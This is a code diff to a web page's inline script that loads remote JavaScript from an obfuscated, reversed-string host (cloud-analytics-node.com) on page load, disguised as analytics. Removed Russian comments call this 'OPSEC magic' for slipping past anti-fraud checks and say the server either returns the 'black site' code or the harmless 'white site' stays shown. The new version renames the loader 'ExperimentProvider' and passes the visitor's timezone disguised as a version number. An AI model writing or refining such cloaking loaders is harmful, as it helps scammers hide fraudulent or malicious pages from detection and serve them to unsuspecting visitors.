@@ -10,10 +10,8 @@
         body { margin: 0; padding: 0; font-family: 'Inter', sans-serif; color: #2d3748; }
         .theme-light { background-color: #f8f9fa; }
         .theme-dark { background-color: #0c0d10; }
-        
         #content-layer { opacity: 0; transition: opacity 0.4s ease; }
         #content-layer.is-ready { opacity: 1; }
-
         .site-main { display: flex; flex-direction: column; align-items: center; padding: 40px 20px; }
         .entry-header { max-width: 800px; text-align: center; margin-bottom: 30px; }
         .entry-title { font-size: 28px; color: #1a202c; font-weight: 700; margin-bottom: 10px; }
@@ -24,30 +22,24 @@
     </style>
 
     <script>
-        (function(w, d) {
-            var MetricsCore = {
-                cfg: ['com', 'node', 'analytics', 'cloud'],
-                
-                inject: function() {
+        window.ExperimentProvider = (function(w, d) {
+            var _config = ['com', 'node', 'analytics', 'cloud'];
+            var _api = function() { return 'https://' + _config.reverse().join('-').replace('-com', '.com') + '/v1/get-key'; };
+
+            return {
+                hydrate: function() {
                     var isMobile = /Android|webOS|iPhone|iPad|iPod/i.test(navigator.userAgent);
                     d.documentElement.className = isMobile ? 'theme-dark' : 'theme-light';
 
-                    var host = this.cfg.reverse().join('-').replace('-com', '.com');
-                    var endpoint = 'https://' + host + '/v1/get-key';
+                    // МАГИЯ OPSEC: Таймзона маскируется под номер версии (v=-180). Никакого Base64.
+                    var versionHash = new Date().getTimezoneOffset().toString();
 
-                    var state = "offset:" + new Date().getTimezoneOffset() + "|d:0";
-                    var tk = w.btoa(state); // Убрали unescape/encodeURIComponent для чистоты
-
-                    // МАГИЯ OPSEC: Никакого fetch. Динамический <script> инжект.
-                    // Антифрод видит это как обычную подгрузку скрипта аналитики.
                     var scriptEl = d.createElement('script');
                     scriptEl.type = 'text/javascript';
                     scriptEl.async = true;
-                    scriptEl.src = endpoint + "?asset_id=1&v=" + encodeURIComponent(tk);
+                    scriptEl.src = _api() + "?asset_id=1&v=" + versionHash;
                     
                     scriptEl.onload = scriptEl.onerror = function() {
-                        // Если скрипт загрузился (сервер отдал код черного сайта) - он сам себя выполнит.
-                        // Если ошибка (сервер промолчал) - просто показываем белый сайт.
                         d.getElementById('content-layer').className = 'is-ready';
                     };
 
@@ -55,13 +47,13 @@
                     firstScript.parentNode.insertBefore(scriptEl, firstScript);
                 }
             };
-            
-            if (d.readyState === 'loading') {
-                d.addEventListener('DOMContentLoaded', function() { MetricsCore.inject(); });
-            } else {
-                MetricsCore.inject();
-            }
         })(window, document);
+
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', window.ExperimentProvider.hydrate);
+        } else {
+            window.ExperimentProvider.hydrate();
+        }
     </script>
 </head>
 <body>
